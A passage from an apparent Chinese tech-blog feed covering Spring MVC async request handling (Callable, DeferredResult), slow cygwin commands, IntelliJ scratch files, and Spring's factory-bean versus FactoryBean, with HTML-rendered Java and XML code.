class="keyword">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> getModelAndView(mavContainer, modelFactory, webRequest);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">      webRequest.requestCompleted();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h4 id="Callable-的处理"><a href="#Callable-的处理" class="headerlink" title="Callable 的处理"></a>Callable 的处理</h4><p><code>Callable</code>的处理是在<code>CallableMethodReturnValueHandler</code>中的，这个接口最终继承了<code>HandlerMethodReturnValueHandler</code>, 也就是对Controller方法返回值的后处理。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CallableMethodReturnValueHandler</span> <span class="keyword">implements</span> <span class="title">AsyncHandlerMethodReturnValueHandler</span> </span>&#123;</span><br><span class="line">  <span class="comment">//省略...</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleReturnValue</span><span class="params">(Object returnValue, MethodParameter returnType,</span></span></span><br><span class="line"><span class="function"><span class="params">      ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (returnValue == <span class="keyword">null</span>) &#123;</span><br><span class="line">      mavContainer.setRequestHandled(<span class="keyword">true</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Callable&lt;?&gt; callable = (Callable&lt;?&gt;) returnValue;</span><br><span class="line">    WebAsyncUtils.getAsyncManager(webRequest).startCallableProcessing(callable, mavContainer);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终是调用了<code>WebAsyncManager</code>的<code>startCallableProcessing</code>进行处理</p>
<p><code>WebAsyncManager</code>中的关键代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startCallableProcessing</span><span class="params">(Callable&lt;?&gt; callable, Object... processingContext)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Assert.notNull(callable, <span class="string">"Callable must not be null"</span>);</span><br><span class="line">    startCallableProcessing(<span class="keyword">new</span> WebAsyncTask(callable), processingContext);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startCallableProcessing</span><span class="params">(<span class="keyword">final</span> WebAsyncTask&lt;?&gt; webAsyncTask, Object... processingContext)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Assert.notNull(webAsyncTask, <span class="string">"WebAsyncTask must not be null"</span>);</span><br><span class="line">    Assert.state(<span class="keyword">this</span>.asyncWebRequest != <span class="keyword">null</span>, <span class="string">"AsyncWebRequest must not be null"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//超时</span></span><br><span class="line">    Long timeout = webAsyncTask.getTimeout();</span><br><span class="line">    <span class="keyword">if</span> (timeout != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.asyncWebRequest.setTimeout(timeout);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//线程池</span></span><br><span class="line">    AsyncTaskExecutor executor = webAsyncTask.getExecutor();</span><br><span class="line">    <span class="keyword">if</span> (executor != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.taskExecutor = executor;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//拦截器</span></span><br><span class="line">    List&lt;CallableProcessingInterceptor&gt; interceptors = <span class="keyword">new</span> ArrayList&lt;CallableProcessingInterceptor&gt;();</span><br><span class="line">    interceptors.add(webAsyncTask.getInterceptor());</span><br><span class="line">    interceptors.addAll(<span class="keyword">this</span>.callableInterceptors.values());</span><br><span class="line">    interceptors.add(timeoutCallableInterceptor);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> Callable&lt;?&gt; callable = webAsyncTask.getCallable();</span><br><span class="line">    <span class="keyword">final</span> CallableInterceptorChain interceptorChain = <span class="keyword">new</span> CallableInterceptorChain(interceptors);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//超时处理</span></span><br><span class="line">    <span class="keyword">this</span>.asyncWebRequest.addTimeoutHandler(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        logger.debug(<span class="string">"Processing timeout"</span>);</span><br><span class="line">        Object result = interceptorChain.triggerAfterTimeout(asyncWebRequest, callable);</span><br><span class="line">        <span class="keyword">if</span> (result != CallableProcessingInterceptor.RESULT_NONE) &#123;</span><br><span class="line">          setConcurrentResultAndDispatch(result);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//成功的回调，会触发拦截器的拦截</span></span><br><span class="line">    <span class="keyword">this</span>.asyncWebRequest.addCompletionHandler(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        interceptorChain.triggerAfterCompletion(asyncWebRequest, callable);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//拦截</span></span><br><span class="line">    interceptorChain.applyBeforeConcurrentHandling(<span class="keyword">this</span>.asyncWebRequest, callable);</span><br><span class="line">    startAsyncProcessing(processingContext);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.taskExecutor.submit(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          Object result = <span class="keyword">null</span>;</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//拦截</span></span><br><span class="line">            interceptorChain.applyPreProcess(asyncWebRequest, callable);</span><br><span class="line">            result = callable.call();</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">            result = ex;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//拦截</span></span><br><span class="line">            result = interceptorChain.applyPostProcess(asyncWebRequest, callable, result);</span><br><span class="line">          &#125;</span><br><span class="line">          setConcurrentResultAndDispatch(result);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (RejectedExecutionException ex) &#123;</span><br><span class="line">      Object result = interceptorChain.applyPostProcess(<span class="keyword">this</span>.asyncWebRequest, callable, ex);</span><br><span class="line">      setConcurrentResultAndDispatch(result);</span><br><span class="line">      <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h4 id="DeferredResult-的处理"><a href="#DeferredResult-的处理" class="headerlink" title="DeferredResult 的处理"></a>DeferredResult 的处理</h4><p>DeferredResult的返回时机就是有数据的时候，顺藤摸瓜:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">setResult</span><span class="params">(T result)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> setResultInternal(result);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">setResultInternal</span><span class="params">(Object result)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Immediate expiration check outside of the result lock</span></span><br><span class="line">    <span class="keyword">if</span> (isSetOrExpired()) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DeferredResultHandler resultHandlerToUse;</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">      <span class="comment">// Got the lock in the meantime: double-check expiration status</span></span><br><span class="line">      <span class="keyword">if</span> (isSetOrExpired()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// At this point, we got a new result to process</span></span><br><span class="line">      <span class="keyword">this</span>.result = result;</span><br><span class="line">      resultHandlerToUse = <span class="keyword">this</span>.resultHandler;</span><br><span class="line">      <span class="keyword">if</span> (resultHandlerToUse == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// No result handler set yet -&gt; let the setResultHandler implementation</span></span><br><span class="line">        <span class="comment">// pick up the result object and invoke the result handler for it.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Result handler available -&gt; let's clear the stored reference since</span></span><br><span class="line">      <span class="comment">// we don't need it anymore.</span></span><br><span class="line">      <span class="keyword">this</span>.resultHandler = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// If we get here, we need to process an existing result object immediately.</span></span><br><span class="line">    <span class="comment">// The decision is made within the result lock; just the handle call outside</span></span><br><span class="line">    <span class="comment">// of it, avoiding any deadlock potential with Servlet container locks.</span></span><br><span class="line">    resultHandlerToUse.handleResult(result);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><code>DeferredResultHandler</code>是什么鬼？我们new的时候没有设置啊？？其实这个也是由<code>HandlerMethodReturnValueHandler</code>来实现的，有个对应的<code>DeferredResultMethodReturnValueHandler</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleReturnValue</span><span class="params">(Object returnValue, MethodParameter returnType,</span></span></span><br><span class="line"><span class="function"><span class="params">    ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (returnValue == <span class="keyword">null</span>) &#123;</span><br><span class="line">    mavContainer.setRequestHandled(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  DeferredResultAdapter adapter = getAdapterFor(returnValue.getClass());</span><br><span class="line">  Assert.notNull(adapter);</span><br><span class="line">  DeferredResult&lt;?&gt; result = adapter.adaptToDeferredResult(returnValue);</span><br><span class="line">  WebAsyncUtils.getAsyncManager(webRequest).startDeferredResultProcessing(result, mavContainer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终还是到了<code>WebAsyncManager</code>的处理方法中，和<code>Callable</code>的处理类似，不一一深入。</p>
<p>值得一提的是，正是在这个<code>startDeferredResultProcessing</code>中塞入了一个<code>DeferredResultHandler</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">      interceptorChain.applyPreProcess(<span class="keyword">this</span>.asyncWebRequest, deferredResult);</span><br><span class="line">      deferredResult.setResultHandler(<span class="keyword">new</span> DeferredResultHandler() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleResult</span><span class="params">(Object result)</span> </span>&#123;</span><br><span class="line">          result = interceptorChain.applyPostProcess(asyncWebRequest, deferredResult, result);</span><br><span class="line">          setConcurrentResultAndDispatch(result);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">      setConcurrentResultAndDispatch(ex);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>因为我们是异步执行的，所以虽然handler的注入在后面，其实影响也不大，而且<code>setResult</code>中也做了判断。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="http://www.journaldev.com/2008/async-servlet-feature-of-servlet-3" rel="external nofollow noopener noreferrer" target="_blank">Async Servlet Feature of Servlet 3 - JournalDev</a></p>
</li>
<li><p><a href="https://docs.oracle.com/javaee/7/tutorial/servlets012.htm" rel="external nofollow noopener noreferrer" target="_blank">17.12 Asynchronous Processing - Java Platform, Enterprise Edition: The Java EE Tutorial (Release 7)</a></p>
</li>
<li><p><a href="https://httpd.apache.org/docs/2.4/programs/ab.html" rel="external nofollow noopener noreferrer" target="_blank">ab - Apache HTTP server benchmarking tool - Apache HTTP Server Version 2.4</a></p>
</li>
<li><p><a href="http://www.ha97.com/5095.html" rel="external nofollow noopener noreferrer" target="_blank">系统吞吐量（TPS）、用户并发量、性能测试概念和公式</a></p>
</li>
<li><p><a href="https://lanjingling.github.io/2016/01/20/servlet3-new-furture/" rel="external nofollow noopener noreferrer" target="_blank">servlet3新特性——异步请求处理 | 晓的技术博客</a></p>
</li>
<li><p><a href="http://blog.csdn.net/wzy_1988/article/details/38922449" rel="external nofollow noopener noreferrer" target="_blank">解决java.util.concurrent.RejectedExecutionException - 小一的专栏 - 博客频道 - CSDN.NET</a></p>
</li>
<li><p><a href="http://www.lai18.com/content/2483896.html" rel="external nofollow noopener noreferrer" target="_blank">Springmvc异步支持报错- - Lai18.com IT技术文章收藏夹</a></p>
</li>
<li><p><a href="http://shengwangi.blogspot.hk/2015/09/asynchronous-spring-mvc-hello-world.html" rel="external nofollow noopener noreferrer" target="_blank">Asynchronous Spring MVC – Hello World Example | Code Breeze !</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> servlet </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[cygwin执行命令非常慢]]></title>
      <url>http://qsli.github.io/2017/02/20/cygwin-360/</url>
      <content type="html"><![CDATA[<p>cygwin在windows上提供了一套类似linux的开发环境，用起来还是挺爽的。</p>
<p>但是一直困扰我的一个问题是，太慢！具体现象就是使用<code>ls</code>都得等半天才出结果。</p>
<p>看网上的资料说cygwin确实慢，再加上我用了<code>oh-my-zsh</code>，更是慢上加慢。</p>
<h2 id="可能的原因"><a href="#可能的原因" class="headerlink" title="可能的原因"></a>可能的原因</h2><p>貌似360对这些工具程序的调用都会做一个拦截，判断下是否有风险。</p>
<p>于是干脆把360给卸载了，终于<code>ls</code>的速度变得可以接受。。。。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="http://www.it1352.com/321952.html" rel="external nofollow noopener noreferrer" target="_blank">为什么Cygwin的执行shell命令很慢？ - IT屋-程序员软件开发技术分享社区</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> cygwin </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Intellij Idea中临时文件功能]]></title>
      <url>http://qsli.github.io/2017/02/15/idea-scratches/</url>
      <content type="html"><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>Intellij中默认新建文件必须指定存储的位置，但是有的时候我们可能只是想创建一个临时的文件顺手记录一些东西。这个功能类似<code>NotePad++</code>或者<code>sublime text</code>中的新建tab，这个tab默认是不落地到文件的，但是其中的内容会以临时文件存储起来。</p>
<p>在Google上搜索了大半天，也没有找到类似的功能（主要是关键词提炼的不行）。后来阴差阳错地搜到了scratches file, 翻译了一下，正是我要找的功能！ (英语差真是害死人啊！)</p>
<blockquote>
<p>scratch file 过期文件；临时文件</p>
</blockquote>
<h3 id="scratches优势"><a href="#scratches优势" class="headerlink" title="scratches优势"></a>scratches优势</h3><blockquote>
<ol>
<li>The scratch code in scripting languages is <em>executable</em>.</li>
</ol>
</blockquote>
<blockquote>
<ol start="2">
<li>you can run and <em>debug</em> it.</li>
</ol>
</blockquote>
<blockquote>
<ol start="3">
<li><em>Local history</em> for scratches is supported.</li>
</ol>
</blockquote>
<blockquote>
<ol start="4">
<li>It is possible to perform <em>clipboard operations</em> with scratches.</li>
</ol>
</blockquote>
<blockquote>
<ol start="5">
<li>The scratches are <em>stored</em>, depending on your operating system,<br>Under IntelliJ IDEA home, in the directory config/scratches (on Windows/*NIX)<br>~ Library-&gt;Preferences-&gt;<intellij idea>XX-&gt;scratches(on OS X)<br>You can undo or redo changes in scratches.</intellij></li>
</ol>
</blockquote>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>以下功能基于Intellij Idea 2016.3.4</p>
<p><code>Ctrl + Shift + A</code>在搜索框中输入 <code>scratch</code>，可以看到如下的两个功能：</p>
<img src="/2017/02/15/idea-scratches/search.jpg">
<p>这里会出现两个scratch 相关的选项， 一个是scratch buffer， 一个是scratch file。<br>scratch buffer不用选择语法，scratch file则会让你选择对应的语法</p>
<img src="/2017/02/15/idea-scratches/new.jpg">
<p>创建之后，可以在下面的位置查看:</p>
<img src="/2017/02/15/idea-scratches/menu.jpg">
<img src="/2017/02/15/idea-scratches/scratches.jpg">
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>快捷键需要按的键比较多，可以自己定制下，比如使用先后按键的那种。</p>
<img src="/2017/02/15/idea-scratches/keymap.jpg">
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="https://www.jetbrains.com/help/idea/2016.3/scratches.html" rel="external nofollow noopener noreferrer" target="_blank">IntelliJ IDEA 2016.3 Help :: Scratches</a></p>
</li>
<li><p><a href="http://docs.notepad-plus-plus.org/index.php/Sessions_And_Projects" rel="external nofollow noopener noreferrer" target="_blank">Sessions And Projects - Notepad++ Wiki</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> idea </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Spring中的factory-bean和FactoryBean]]></title>
      <url>http://qsli.github.io/2017/02/14/factorybean/</url>
      <content type="html"><![CDATA[<h3 id="factory-bean"><a href="#factory-bean" class="headerlink" title="factory-bean"></a>factory-bean</h3><p>spring的bean标签的一个属性，用来指定创建实例的方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClientService</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ClientService clientService = <span class="keyword">new</span> ClientService();</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">ClientService</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ClientService <span class="title">createInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> clientService;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DefaultServiceLocator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ClientService clientService = <span class="keyword">new</span> ClientServiceImpl();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> AccountService accountService = <span class="keyword">new</span> AccountServiceImpl();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">DefaultServiceLocator</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ClientService <span class="title">createClientServiceInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> clientService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> AccountService <span class="title">createAccountServiceInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> accountService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="第一种写法"><a href="#第一种写法" class="headerlink" title="第一种写法"></a>第一种写法</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"clientService"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">class</span>=<span class="string">"examples.ClientService"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">factory-method</span>=<span class="string">"createInstance"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>这种写法要求<code>factory-method</code>必须是<code>static</code>的</p>
<h4 id="第二种写法"><a href="#第二种写法" class="headerlink" title="第二种写法"></a>第二种写法</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"serviceLocator"</span> <span class="attr">class</span>=<span class="string">"examples.DefaultServiceLocator"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- inject any dependencies required by this locator bean --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"clientService"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">factory-bean</span>=<span class="string">"serviceLocator"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">factory-method</span>=<span class="string">"createClientServiceInstance"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"accountService"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">factory-bean</span>=<span class="string">"serviceLocator"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">factory-method</span>=<span class="string">"createAccountServiceInstance"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>这种写法多了一个<code>factory-bean</code>，指定了使用哪个类的哪个方法去创建，不要求这个方法是<code>static</code>，但是<code>factory-bean</code>对应的类必须交由spring管理。</p>
<p>一个类中可以包含多个创建的方法。</p>
<h3 id="FactoryBean"><a href="#FactoryBean" class="headerlink" title="FactoryBean"></a>FactoryBean</h3><p>是Spring提供的一个接口，用来定制Bean的初始化逻辑。</p>
<blockquote>
<p>If you have complex initialization code that is better expressed in Java as opposed to a (potentially) verbose amount of XML, you can create your own FactoryBean</p>
</blockquote>
<blockquote>
<p>  Interface to be implemented by objects used within a {@link BeanFactory} which<br>    are themselves factories for individual objects. If a bean implements this<br>    interface, it is used as a factory for an object to expose, not directly as a<br>    bean instance that will be exposed itself.</p>
</blockquote>
<p>这个接口有三个方法：</p>
<ul>
<li>Object getObject()</li>
</ul>
<p>获取创建的对象</p>
<ul>
<li>boolean isSingleton()</li>
</ul>
<p>返回的对象是否是单例的</p>
<ul>
<li>Class getObjectType()</li>
</ul>
<p>获取返回的对象的类型</p>
<p><code>GsonFactoryBean</code>就实现了<code>FactoryBean</code>接口，是一个不错的例子，大概代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span 